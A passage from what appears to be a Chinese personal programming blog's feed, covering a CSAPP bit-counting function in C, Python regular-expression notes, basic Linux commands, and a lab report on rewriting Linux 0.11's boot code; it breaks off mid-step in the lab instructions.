class="number">0xff</span> &lt;&lt; <span class="number">16</span>);</div><div class="line">	<span class="keyword">int</span> mask5 = (<span class="number">0xff</span>) | (<span class="number">0xff</span> &lt;&lt; <span class="number">8</span>);</div><div class="line">	<span class="keyword">int</span> count = x;</div><div class="line">	count = (count &amp; mask1) + ((count &gt;&gt; <span class="number">1</span>) &amp; mask1);</div><div class="line">	count = (count &amp; mask2) + ((count &gt;&gt; <span class="number">2</span>) &amp; mask2);</div><div class="line">	count = (count &amp; mask3) + ((count &gt;&gt; <span class="number">4</span>) &amp; mask3);</div><div class="line">	count = (count &amp; mask4) + ((count &gt;&gt; <span class="number">8</span>) &amp; mask4);</div><div class="line">	count = (count &amp; mask5) + ((count &gt;&gt; <span class="number">16</span>) &amp; mask5);</div><div class="line">	<span class="keyword">return</span> count;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"bitCount(5) = %d\nbitCount(7) = %d\n"</span>, bitCount(<span class="number">5</span>), bitCount(<span class="number">7</span>));</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;《CSAPP》上的题目，略有难度。&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/C/"/>
    
    
      <category term="C" scheme="http://gaufoo.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Python之Re库学习笔记</title>
    <link href="http://gaufoo.com/2017/09/05/Python%E4%B9%8BRe%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://gaufoo.com/2017/09/05/Python之Re库学习笔记/</id>
    <published>2017-09-05T09:05:00.000Z</published>
    <updated>2017-09-06T09:17:49.869Z</updated>
    
    <content type="html"><![CDATA[<p>记录以备后用</p>
<a id="more"></a>
<hr>
<h2 id="正则表达式的使用"><a href="#正则表达式的使用" class="headerlink" title="正则表达式的使用"></a>正则表达式的使用</h2><h3 id="常用操作符"><a href="#常用操作符" class="headerlink" title="常用操作符"></a>常用操作符</h3><table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>.</td>
<td>表示任何单个字符</td>
<td>-</td>
</tr>
<tr>
<td>[ ]</td>
<td>字符集，对单个字符给出取值范围</td>
<td>[abc]表示a、b、c，[a‐z]表示a到z单个字符</td>
</tr>
<tr>
<td>[^ ]</td>
<td>非字符集，对单个字符给出排除范围</td>
<td>[^abc]表示非a或b或c的单个字符</td>
</tr>
<tr>
<td>*</td>
<td>前一个字符0次或无限次扩展</td>
<td>abc* 表示 ab、abc、abcc、abccc等</td>
</tr>
<tr>
<td>+</td>
<td>前一个字符1次或无限次扩展</td>
<td>abc+ 表示 abc、abcc、abccc等</td>
</tr>
<tr>
<td>?</td>
<td>前一个字符0次或1次扩展</td>
<td>abc? 表示 ab、abc</td>
</tr>
<tr>
<td>&#124;</td>
<td>左右表达式任意一个</td>
<td>abc&#124;def 表示 abc、def</td>
</tr>
<tr>
<td>{m}</td>
<td>扩展前一个字符m次</td>
<td>ab{2}c表示abbc</td>
</tr>
<tr>
<td>{m,n}</td>
<td>扩展前一个字符m至n次（含n）</td>
<td>ab{1,2}c表示abc、abbc</td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串开头</td>
<td>^abc表示abc且在一个字符串的开头</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
<td>abc$表示abc且在一个字符串的结尾</td>
</tr>
<tr>
<td>( )</td>
<td>分组标记，内部只能使用 &#124; 操作符</td>
<td>(abc)表示abc，(abc&#124;def)表示abc、def</td>
</tr>
<tr>
<td>\d</td>
<td>数字，等价于[0-9]</td>
<td>-</td>
</tr>
<tr>
<td>\w</td>
<td>单词字符，等价于[A-Za-z0-9_]</td>
<td>-</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="经典正则表达式实例"><a href="#经典正则表达式实例" class="headerlink" title="经典正则表达式实例"></a>经典正则表达式实例</h3><ul>
<li><code>^[A‐Za‐z]+$</code>：由26个字母组成的字符串</li>
<li><code>^[A‐Za‐z0‐9]+$</code>：由26个字母和数字组成的字符串</li>
<li><code>^‐?\d+$</code>：整数形式的字符串</li>
<li><code>[1‐9]\d{5}</code>：中国境内邮政编码，6位</li>
<li><code>[\u4e00‐\u9fa5]</code>：匹配中文字符、</li>
<li><code>\d{3}‐\d{8}|\d{4}‐\d{7}</code>：国内电话号码，010‐68913536</li>
<li>IP地址<ul>
<li>0-99：<code>[1‐9]?\d</code></li>
<li>100-199：<code>1\d{2}</code></li>
<li>200-249：<code>2[0‐4]\d</code></li>
<li>250-255：<code>25[0‐5]</code></li>
<li>总：<code>(([1‐9]?\d|1\d{2}|2[0‐4]\d|25[0‐5]).){3}([1‐9]?\d|1\d{2}|2[0‐4]\d|25[0‐5])</code></li>
</ul>
</li>
</ul>
<hr>
<h2 id="Re库主要功能函数"><a href="#Re库主要功能函数" class="headerlink" title="Re库主要功能函数"></a>Re库主要功能函数</h2><h3 id="re-search-pattern-string-flags-0"><a href="#re-search-pattern-string-flags-0" class="headerlink" title="re.search(pattern, string, flags=0)"></a>re.search(pattern, string, flags=0)</h3><p>在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</p>
<ul>
<li><code>pattern</code>：正则表达式的字符串或原生字符串表示</li>
<li><code>string</code>：待匹配字符串</li>
<li><code>flags</code>：正则表达式使用时的控制标记<ul>
<li><code>re.I</code> - re.IGNORECASE：忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
<li><code>re.M</code> - re.MULTILINE：正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
<li><code>re.S</code> - re.DOTALL：正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
</ul>
</li>
</ul>
<hr>
<h3 id="re-match-pattern-string-flags-0"><a href="#re-match-pattern-string-flags-0" class="headerlink" title="re.match(pattern, string, flags=0)"></a>re.match(pattern, string, flags=0)</h3><p>从一个字符串的开始位置起匹配正则表达式，返回match对象</p>
<ul>
<li><code>pattern</code>：正则表达式的字符串或原生字符串表示</li>
<li><code>string</code>：待匹配字符串</li>
<li><code>flags</code>：正则表达式使用时的控制标记<ul>
<li><code>re.I</code> - re.IGNORECASE：忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
<li><code>re.M</code> - re.MULTILINE：正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
<li><code>re.S</code> - re.DOTALL：正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
</ul>
</li>
</ul>
<hr>
<h3 id="re-findall-pattern-string-flags-0"><a href="#re-findall-pattern-string-flags-0" class="headerlink" title="re.findall(pattern, string, flags=0)"></a>re.findall(pattern, string, flags=0)</h3><p>搜索字符串，以列表类型返回全部能匹配的子串</p>
<ul>
<li><code>pattern</code>：正则表达式的字符串或原生字符串表示</li>
<li><code>string</code>：待匹配字符串</li>
<li><code>flags</code>：正则表达式使用时的控制标记<ul>
<li><code>re.I</code> - re.IGNORECASE：忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
<li><code>re.M</code> - re.MULTILINE：正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
<li><code>re.S</code> - re.DOTALL：正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
</ul>
</li>
</ul>
<hr>
<h3 id="re-split-pattern-string-maxsplit-0-flags-0"><a href="#re-split-pattern-string-maxsplit-0-flags-0" class="headerlink" title="re.split(pattern, string, maxsplit=0, flags=0)"></a>re.split(pattern, string, maxsplit=0, flags=0)</h3><p>将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</p>
<ul>
<li><code>pattern</code>：正则表达式的字符串或原生字符串表示</li>
<li><code>string</code>：待匹配字符串</li>
<li><code>maxsplit</code>：最大分割数，剩余部分作为最后一个元素输出</li>
<li><code>flags</code>：正则表达式使用时的控制标记<ul>
<li><code>re.I</code> - re.IGNORECASE：忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
<li><code>re.M</code> - re.MULTILINE：正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
<li><code>re.S</code> - re.DOTALL：正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
</ul>
</li>
</ul>
<hr>
<h3 id="re-finditer-pattern-string-flags-0"><a href="#re-finditer-pattern-string-flags-0" class="headerlink" title="re.finditer(pattern, string, flags=0)"></a>re.finditer(pattern, string, flags=0)</h3><p>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</p>
<ul>
<li><code>pattern</code>：正则表达式的字符串或原生字符串表示</li>
<li><code>string</code>：待匹配字符串</li>
<li><code>flags</code>：正则表达式使用时的控制标记<ul>
<li><code>re.I</code> - re.IGNORECASE：忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
<li><code>re.M</code> - re.MULTILINE：正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
<li><code>re.S</code> - re.DOTALL：正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
</ul>
</li>
</ul>
<hr>
<h3 id="re-sub-pattern-repl-string-count-0-flags-0"><a href="#re-sub-pattern-repl-string-count-0-flags-0" class="headerlink" title="re.sub(pattern, repl, string, count=0, flags=0)"></a>re.sub(pattern, repl, string, count=0, flags=0)</h3><p>在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</p>
<ul>
<li><code>pattern</code>：正则表达式的字符串或原生字符串表示</li>
<li><code>repl</code>：替换匹配字符串的字符串</li>
<li><code>string</code>：待匹配字符串</li>
<li><code>count</code>：匹配的最大替换次数</li>
<li><code>flags</code>：正则表达式使用时的控制标记<ul>
<li><code>re.I</code> - re.IGNORECASE：忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
<li><code>re.M</code> - re.MULTILINE：正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
<li><code>re.S</code> - re.DOTALL：正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
</ul>
</li>
</ul>
<hr>
<h3 id="Re库另一种等价用法"><a href="#Re库另一种等价用法" class="headerlink" title="Re库另一种等价用法"></a>Re库另一种等价用法</h3><p><strong>regex = re.compile(pattern, flags=0)</strong><br>将正则表达式的字符串形式编译成正则表达式对象</p>
<ul>
<li><code>pattern</code>：正则表达式的字符串或原生字符串表示</li>
<li><code>flags</code>：正则表达式使用时的控制标记<ul>
<li><code>re.I</code> - re.IGNORECASE：忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
<li><code>re.M</code> - re.MULTILINE：正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
<li><code>re.S</code> - re.DOTALL：正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>regex.search()</td>
<td>在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</td>
</tr>
<tr>
<td>regex.match()</td>
<td>从一个字符串的开始位置起匹配正则表达式，返回match对象</td>
</tr>
<tr>
<td>regex.findall()</td>
<td>搜索字符串，以列表类型返回全部能匹配的子串</td>
</tr>
<tr>
<td>regex.split()</td>
<td>将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td>
</tr>
<tr>
<td>regex.finditer()</td>
<td>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</td>
</tr>
<tr>
<td>regex.sub()</td>
<td>在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="Re库的Match对象"><a href="#Re库的Match对象" class="headerlink" title="Re库的Match对象"></a>Re库的Match对象</h2><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><ul>
<li><code>.string</code>：待匹配的文本</li>
<li><code>.re</code>：匹配时使用的patter对象（正则表达式）</li>
<li><code>.pos</code>：正则表达式搜索文本的开始位置</li>
<li><code>.endpos</code>：正则表达式搜索文本的结束位置</li>
</ul>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul>
<li><code>.group(0)</code>：获得匹配后的字符串</li>
<li><code>.start()</code>：匹配字符串在原始字符串的开始位置</li>
<li><code>.end()</code>：匹配字符串在原始字符串的结束位置</li>
<li><code>.span()</code>：返回(.start(), .end())</li>
</ul>
<hr>
<h2 id="Re库的贪婪匹配和最小匹配"><a href="#Re库的贪婪匹配和最小匹配" class="headerlink" title="Re库的贪婪匹配和最小匹配"></a>Re库的贪婪匹配和最小匹配</h2><p>Re库默认采用贪婪匹配，即输出匹配最长的子串<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.search(<span class="string">r'PY.*N'</span>, <span class="string">'PYANBNCNDN'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>match.group(<span class="number">0</span>)</div><div class="line"><span class="string">'PYANBNCNDN'</span></div></pre></td></tr></table></figure></p>
<h3 id="最小匹配操作符"><a href="#最小匹配操作符" class="headerlink" title="最小匹配操作符"></a>最小匹配操作符</h3><p>只要长度输出可能不同的，都可以通过在操作符后增加?变成最小匹配</p>
<ul>
<li><code>*?</code>：前一个字符0次或无限次扩展，最小匹配</li>
<li><code>+?</code>：前一个字符1次或无限次扩展，最小匹配</li>
<li><code>??</code>：前一个字符0次或1次扩展，最小匹配</li>
<li><code>{m,n}?</code>：扩展前一个字符m至n次（含n），最小匹配</li>
</ul>
<p>输出最短的子串<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.search(<span class="string">r'PY.*?N'</span>, <span class="string">'PYANBNCNDN'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>match.group(<span class="number">0</span>)</div><div class="line"><span class="string">'PYAN'</span></div></pre></td></tr></table></figure></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录以备后用&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/Python/"/>
    
    
      <category term="Python" scheme="http://gaufoo.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linux常用命令，持续更新</title>
    <link href="http://gaufoo.com/2017/09/05/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <id>http://gaufoo.com/2017/09/05/Linux常用命令，持续更新/</id>
    <published>2017-09-05T07:14:00.000Z</published>
    <updated>2017-09-06T09:17:26.979Z</updated>
    
    <content type="html"><![CDATA[<p>记录<br><a id="more"></a></p>
<hr>
<h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><table>
<thead>
<tr>
<th>按键</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Ctrl+d</code></td>
<td>键盘输入结束或退出终端</td>
</tr>
<tr>
<td><code>Ctrl+s</code></td>
<td>暂停当前程序，暂停后按下任意键恢复运行</td>
</tr>
<tr>
<td><code>Ctrl+z</code></td>
<td>将当前程序放到后台运行，恢复到前台为命令<code>fg</code></td>
</tr>
<tr>
<td><code>Ctrl+a</code></td>
<td>将光标移至输入行头，相当于<code>Home</code></td>
</tr>
<tr>
<td><code>Ctrl+e</code></td>
<td>将光标移至输入行末，相当于<code>End</code></td>
</tr>
<tr>
<td><code>Ctrl+k</code></td>
<td>删除从光标所在位置到行末</td>
</tr>
<tr>
<td><code>Alt+Backspave</code></td>
<td>向前删除一个单词</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="常用通配符"><a href="#常用通配符" class="headerlink" title="常用通配符"></a>常用通配符</h2><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*</code></td>
<td>匹配0或多个字符</td>
</tr>
<tr>
<td><code>?</code></td>
<td>匹配任意一个字符</td>
</tr>
<tr>
<td><code>[list]</code></td>
<td>匹配list中的任意单一字符</td>
</tr>
<tr>
<td><code>[!list]</code></td>
<td>匹配除list中的任意单一字符</td>
</tr>
<tr>
<td><code>[c1-c2]</code></td>
<td>匹配c1-c2中的任意单一字符 如：<code>[0-9]</code> <code>[a-z]</code></td>
</tr>
<tr>
<td><code>{string1,string2,...}</code></td>
<td>匹配string1或string2（或更多）其一字符串</td>
</tr>
<tr>
<td><code>{c1..c2}</code></td>
<td>匹配c1-c2中全部字符 如{1..10}</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h3 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ls -l</span></div><div class="line">drwxr-xr-x 2 gaufoo gaufoo 4096 11月 6 15:30 Document</div></pre></td></tr></table></figure>
<ul>
<li>文件类型<br> <code>d</code>：目录<br> <code>l</code>：软链接<br> <code>b</code>：块设备<br> <code>c</code>：字符设备<br> <code>s</code>：socket<br> <code>p</code>：管道<br> <code>-</code>：普通文件</li>
<li>文件权限<br> <code>r</code>：读<br> <code>w</code>：写<br> <code>x</code>：执行 </li>
</ul>
<h3 id="变更文件所有者"><a href="#变更文件所有者" class="headerlink" title="变更文件所有者"></a>变更文件所有者</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo chown ??? ???</span></div></pre></td></tr></table></figure>
<h3 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> chmod 700 ???</span></div></pre></td></tr></table></figure>
<h2 id="文件基本操作"><a href="#文件基本操作" class="headerlink" title="文件基本操作"></a>文件基本操作</h2><h3 id="复制目录"><a href="#复制目录" class="headerlink" title="复制目录"></a>复制目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cp -r ??? ???</span></div></pre></td></tr></table></figure>
<h3 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> rm -r ???</span></div></pre></td></tr></table></figure>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://gaufoo.com/categories/Linux/"/>
    
      <category term="命令" scheme="http://gaufoo.com/categories/Linux/%E5%91%BD%E4%BB%A4/"/>
    
    
      <category term="Linux" scheme="http://gaufoo.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>操作系统boot实验报告</title>
    <link href="http://gaufoo.com/2017/09/03/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Fboot%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://gaufoo.com/2017/09/03/操作系统boot实验报告/</id>
    <published>2017-09-03T07:14:00.000Z</published>
    <updated>2017-09-06T09:18:08.350Z</updated>
    
    <content type="html"><![CDATA[<p>HIT操作系统课程第一个实验。</p>
<a id="more"></a>
<hr>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul>
<li>熟悉hit-oslab实验环境；</li>
<li>建立对操作系统引导过程的深入认识；</li>
<li>掌握操作系统的基本开发过程；</li>
<li>能对操作系统代码进行简单的控制，揭开操作系统的神秘面纱。</li>
</ul>
<hr>
<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>此次实验的基本内容是：</p>
<ol>
<li>阅读《Linux内核完全注释》的第6章，对计算机和Linux 0.11的引导过程进行初步的了解；</li>
<li>按照下面的要求改写0.11的引导程序bootsect.s</li>
<li>有兴趣同学可以做做进入保护模式前的设置程序setup.s。</li>
</ol>
<p>改写bootsect.s主要完成如下功能：</p>
<ol>
<li>bootsect.s能在屏幕上打印一段提示信息“XXX is booting…”，其中XXX是你给自己的操作系统起的名字，例如LZJos、Sunix等（可以上论坛上秀秀谁的OS名字最帅，也可以显示一个特色logo，以表示自己操作系统的与众不同。）</li>
</ol>
<p>改写setup.s主要完成如下功能：</p>
<ol>
<li>bootsect.s能完成setup.s的载入，并跳转到setup.s开始地址执行。而setup.s向屏幕输出一行”Now we are in SETUP”。</li>
<li>setup.s能获取至少一个基本的硬件参数（如内存参数、显卡参数、硬盘参数等），将其存放在内存的特定地址，并输出到屏幕上。</li>
<li>setup.s不再加载Linux内核，保持上述信息显示在屏幕上即可。</li>
</ol>
<hr>
<h2 id="实验报告要求"><a href="#实验报告要求" class="headerlink" title="实验报告要求"></a>实验报告要求</h2><p>在实验报告中回答如下问题：</p>
<ol>
<li>有时，继承传统意味着别手蹩脚。x86计算机为了向下兼容，导致启动过程比较复杂。请找出x86计算机启动过程中，被硬件强制，软件必须遵守的两个“多此一举”的步骤（多找几个也无妨），说说它们为什么多此一举，并设计更简洁的替代方案。</li>
</ol>
<hr>
<h2 id="实验记录"><a href="#实验记录" class="headerlink" title="实验记录"></a>实验记录</h2><h3 id="改写bootsect-s："><a href="#改写bootsect-s：" class="headerlink" title="改写bootsect.s："></a>改写<code>bootsect.s</code>：</h3><ol>
<li><p>进入目录<code>~/oslab/linux-0.11/boot/</code>，执行<code>$ vi bootsect.s</code>，将<code>bootsect.s</code>修改如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">...</div><div class="line">! Print some inane message</div><div class="line"></div><div class="line">	mov	ah,#0x03		! read cursor pos</div><div class="line">	xor	bh,bh</div><div class="line">	int	0x10</div><div class="line">	</div><div class="line">	mov	cx,#29          ! 修改字符数</div><div class="line">	mov	bx,#0x0007		! page 0, attribute 7 (normal)</div><div class="line">	mov	bp,#msg1</div><div class="line">	mov	ax,#0x1301		! write string, move cursor</div><div class="line">	int	0x10</div><div class="line"></div><div class="line">! ok, we&apos;ve written the message, now</div><div class="line">...</div><div class="line">...</div><div class="line">msg1:</div><div class="line">	.byte 13,10</div><div class="line">	.ascii &quot;Fooooooos is loading...&quot;     ! 修改成自己的字符串</div><div class="line">	.byte 13,10,13,10</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>
</li>
<li><p>进入目录<code>~/oslab/linux-0.11/boot/</code>，执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> as86 -0 -a -o bootsect.o bootsect.s</span></div><div class="line"><span class="meta">$</span><span class="bash"> ld86 -0 -s -o bootsect bootsect.o</span></div><div class="line"><span class="meta">$</span><span class="bash"> dd bs=1 <span class="keyword">if</span>=bootsect of=Image skip=32</span></div><div class="line"><span class="meta">$</span><span class="bash"> cp Image ../</span></div></pre></td></tr></table></figure>
</li>
<li><p>进入目录<code>~/oslab/</code>，执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ./run</span></div></pre></td></tr></table></figure>
</li>
<li><p>实验结果：<br><img src="/images/5193451504415525106-wm.png" alt="实验楼"></p>
</li>
</ol>
<hr>
<h3 id="读入setup-s并输出字符串："><a href="#读入setup-s并输出字符串：" class="headerlink" title="读入setup.s并输出字符串："></a>读入<code>setup.s</code>并输出字符串：</h3><ol>
<li><p>进入目录<code>~/oslab/linux-0.11/boot/</code>，执行<code>$ vi setup.s</code>，删除加载内核的88-223行代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">! Check that there IS a hd1 :-)</div><div class="line"></div><div class="line">	mov	ax,#0x01500</div><div class="line">	mov	dl,#0x81</div><div class="line">	int	0x13</div><div class="line">	jc	no_disk1</div><div class="line">	cmp	ah,#3</div><div class="line">	je	is_disk1</div><div class="line">...</div><div class="line">...</div><div class="line">gdt_48:</div><div class="line">	.word	0x800		! gdt limit=2048, 256 GDT entries</div><div class="line">	.word	512+gdt,0x9	! gdt base = 0X9xxxx</div></pre></td></tr></table></figure>
</li>
<li><p>进入目录<code>~/oslab/linux-0.11/boot/</code>，执行<code>$ vi setup.s</code>，添加代码至<code>start:</code>后，以及末尾：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">...</div><div class="line">start:</div><div class="line"></div><div class="line">! Print some inane message</div><div class="line">	mov ax,cs</div><div class="line">	mov ds,ax</div><div class="line">	mov es,ax</div><div class="line">	mov	ah,#0x03		! read cursor pos</div><div class="line">	xor	bh,bh</div><div class="line">	int	0x10</div><div class="line">	</div><div class="line">	mov	cx,#24</div><div class="line">	mov	bx,#0x0007		! page 0, attribute 7 (normal)</div><div class="line">	mov	bp,#msg1</div><div class="line">	mov	ax,#0x1301		! write string, move cursor</div><div class="line">	int	0x10</div><div class="line">...</div><div class="line">...</div><div class="line">msg1:</div><div class="line">	.byte 13,10</div><div class="line">	.ascii &quot;Now we are in SETUP&quot;</div><div class="line">	.byte 13,10,13,10</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>
</li>
<li><p>进入目录<code>~/oslab/linux-0.11/tools/</code>，执行<code>$ vi build.c</code>，添加如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">...</div><div class="line">    <span class="keyword">while</span> (i&lt;SETUP_SECTS*<span class="number">512</span>) &#123;</div><div class="line">    	c = SETUP_SECTS*<span class="number">512</span>-i;</div><div class="line">    	<span class="keyword">if</span> (c &gt; <span class="keyword">sizeof</span>(buf))</div><div class="line">    		c = <span class="keyword">sizeof</span>(buf);</div><div class="line">    	<span class="keyword">if</span> (write(<span class="number">1</span>,buf,c) != c)</div><div class="line">    		die(<span class="string">"Write call failed"</span>);</div><div class="line">    	i += c;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">3</span>], <span class="string">"none"</span>) == <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Ignore system written.\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> ((id=open(argv[<span class="number">3</span>],O_RDONLY,<span class="number">0</span>))&lt;<span class="number">0</span>)</div><div class="line">    	die(<span class="string">"Unable to open 'system'"</span>);</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>
</li>
<li><p>进入目录<code>~/oslab/linux-0.11/</code>，执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make BootImage</span></div></pre></td></tr></table></figure>
</li>
<li><p>进入目录<code>~/oslab/</code>，执行：</p>
